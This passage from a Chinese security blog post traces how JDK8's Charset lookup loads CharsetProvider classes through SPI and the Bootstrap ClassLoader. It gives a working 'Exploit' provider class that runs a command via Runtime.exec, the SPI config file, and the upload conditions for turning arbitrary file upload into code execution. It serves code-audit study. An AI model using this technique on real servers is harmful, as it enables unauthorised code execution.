to this effect to the VM by putting the</span><br>    <span class="hljs-comment">// level 1 cache miss code in a separate method.</span><br>    <span class="hljs-keyword">return</span> lookup2(charsetName);<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Charset <span class="hljs-title function_">lookup2</span><span class="hljs-params">(String charsetName)</span> &#123;<br>    Object[] a;<br>    <span class="hljs-keyword">if</span> ((a = cache2) != <span class="hljs-literal">null</span> &amp;&amp; charsetName.equals(a[<span class="hljs-number">0</span>])) &#123;<br>        cache2 = cache1;<br>        cache1 = a;<br>        <span class="hljs-keyword">return</span> (Charset)a[<span class="hljs-number">1</span>];<br>    &#125;<br>    Charset cs;<br>    <span class="hljs-keyword">if</span> ((cs = standardProvider.charsetForName(charsetName)) != <span class="hljs-literal">null</span> ||<br>        (cs = lookupExtendedCharset(charsetName))           != <span class="hljs-literal">null</span> ||<br>        (cs = lookupViaProviders(charsetName))              != <span class="hljs-literal">null</span>)<br>    &#123;<br>        cache(charsetName, cs);<br>        <span class="hljs-keyword">return</span> cs;<br>    &#125;<br><br>    <span class="hljs-comment">/* Only need to check the name if we didn&#x27;t find a charset for it */</span><br>    checkName(charsetName);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上面已经分析cs &#x3D; standardProvider.charsetForName(charsetName)</p>
<p>cs &#x3D; lookupExtendedCharset(charsetName)执行利用链，下来分析cs &#x3D; lookupViaProviders(charsetName))  此利用链</p>
<p>跟进lookupViaProviders(charsetName)</p>
<p>java.nio.charset.Charset#lookupViaProviders(charsetName)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Charset <span class="hljs-title function_">lookupViaProviders</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String charsetName)</span> &#123;<br><br>    <span class="hljs-comment">// The runtime startup sequence looks up standard charsets as a</span><br>    <span class="hljs-comment">// consequence of the VM&#x27;s invocation of System.initializeSystemClass</span><br>    <span class="hljs-comment">// in order to, e.g., set system properties and encode filenames.  At</span><br>    <span class="hljs-comment">// that point the application class loader has not been initialized,</span><br>    <span class="hljs-comment">// however, so we can&#x27;t look for providers because doing so will cause</span><br>    <span class="hljs-comment">// that loader to be prematurely initialized with incomplete</span><br>    <span class="hljs-comment">// information.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">if</span> (!sun.misc.VM.isBooted())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (gate.get() != <span class="hljs-literal">null</span>)<br>        <span class="hljs-comment">// Avoid recursive provider lookups</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        gate.set(gate);<br><br>        <span class="hljs-keyword">return</span> AccessController.doPrivileged(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Charset&gt;() &#123;<br>                <span class="hljs-keyword">public</span> Charset <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                    <span class="hljs-comment">//进入providers()</span><br>                    <span class="hljs-keyword">for</span> (Iterator&lt;CharsetProvider&gt; i = providers();<br>                         i.hasNext();) &#123;<br>                        <span class="hljs-type">CharsetProvider</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> i.next();<br>                        <span class="hljs-type">Charset</span> <span class="hljs-variable">cs</span> <span class="hljs-operator">=</span> cp.charsetForName(charsetName);<br>                        <span class="hljs-keyword">if</span> (cs != <span class="hljs-literal">null</span>)<br>                            <span class="hljs-keyword">return</span> cs;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>            &#125;);<br><br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        gate.set(<span class="hljs-literal">null</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>java.nio.charset.Charset#providers()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Iterator&lt;CharsetProvider&gt; <span class="hljs-title function_">providers</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Iterator</span>&lt;CharsetProvider&gt;() &#123;<br>        	<span class="hljs-comment">//明显此处为SPI加载方式</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>            ServiceLoader&lt;CharsetProvider&gt; sl =<br>                ServiceLoader.load(CharsetProvider.class, cl);<br>            Iterator&lt;CharsetProvider&gt; i = sl.iterator();<br><br>            <span class="hljs-type">CharsetProvider</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">while</span> (next == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">if</span> (!i.hasNext())<br>                            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                        next = i.next();<br>                    &#125; <span class="hljs-keyword">catch</span> (ServiceConfigurationError sce) &#123;<br>                        <span class="hljs-keyword">if</span> (sce.getCause() <span class="hljs-keyword">instanceof</span> SecurityException) &#123;<br>                            <span class="hljs-comment">// Ignore security exceptions</span><br>                            <span class="hljs-keyword">continue</span>;<br>                        &#125;<br>                        <span class="hljs-keyword">throw</span> sce;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> getNext();<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> CharsetProvider <span class="hljs-title function_">next</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">if</span> (!getNext())<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchElementException</span>();<br>                <span class="hljs-type">CharsetProvider</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> next;<br>                next = <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">return</span> n;<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();<br>            &#125;<br><br>        &#125;;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>此处可勇编写一个继承java.nio.charset.spi.CharsetProvider类的恶意provider，通过SPI机制，触发其加载并初始化。</p>
<h4 id="JDK8下的Bootstrap和Ext-ClassLoader"><a href="#JDK8下的Bootstrap和Ext-ClassLoader" class="headerlink" title="JDK8下的Bootstrap和Ext ClassLoader"></a>JDK8下的Bootstrap和Ext ClassLoader</h4><p>根据类的双亲委派模型，类的加载顺序会先从Bootstrap ClassLoader的加载路径中尝试加载，当找不到该类时，才会选择从下一级的ExtClassLoader的加载路径寻找，以此类推到引发加载的类所在的类加载器为止。</p>
<p>Bootstrap ClassLoader(sun.boot.class.path):</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">jre/lib/resources.jar<br>jre/lib/rt.jar<br>jre/lib/sunrsasign.jar<br>jre/lib/jsse.jar<br>jre/lib/jce.jar<br>jre/lib/charsets.jar<br>jre/lib/jfr.jar<br>jre/classes<br></code></pre></td></tr></table></figure>

<p>该列表即为Bootstrap ClassLoader加载类时，文件的读取路径。只需在jre&#x2F;classes目录中写入恶意class和SPI文件，即可在Class.forName的执行中加载到恶意class。</p>
<h4 id="编写恶意类"><a href="#编写恶意类" class="headerlink" title="编写恶意类"></a>编写恶意类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sun.nio.cs.ext;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.charset.Charset;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.nio.charset.spi.CharsetProvider &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Iterator&lt;Charset&gt; <span class="hljs-title function_">charsets</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;Charset&gt;().iterator();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Charset <span class="hljs-title function_">charsetForName</span><span class="hljs-params">(String charsetName)</span> &#123;<br>        <span class="hljs-comment">//此处可获取到传进来的charsetName</span><br>        <span class="hljs-keyword">if</span>(charsetName.contains(<span class="hljs-string">&quot;IBM&quot;</span>))&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> Charset.forName(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编写SPI配置文件</p>
<p>路径：META-INF\services\java.nio.charset.spi.CharsetProvider</p>
<p>内容：sun.nio.cs.ext.Exploit</p>
<p>jre&#x2F;classes目录如下：</p>
<p><img src="/image/image-28.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">Exploit<br>META-INF<br>    └── services<br>        └── java.nio.charset.spi.CharsetProvider<br></code></pre></td></tr></table></figure>

<p>文件上传成功后发包，代码执行</p>
<p><img src="/image/image-29.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h4><p>1、可控制文件路径及文件名</p>
<p>2、知道jre目录并写入jre目录</p>
<p>3、需上传两次文件，一次上传恶意class文件，一次上传SPI  META-INF文件</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>java代码审计之任意文件上传漏洞及常见框架getshell分析</div>
      <div>http://example.com/2023/04/10/java代码审计之任意文件上传漏洞及常见框架getshell分析/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>白给</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年4月10日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
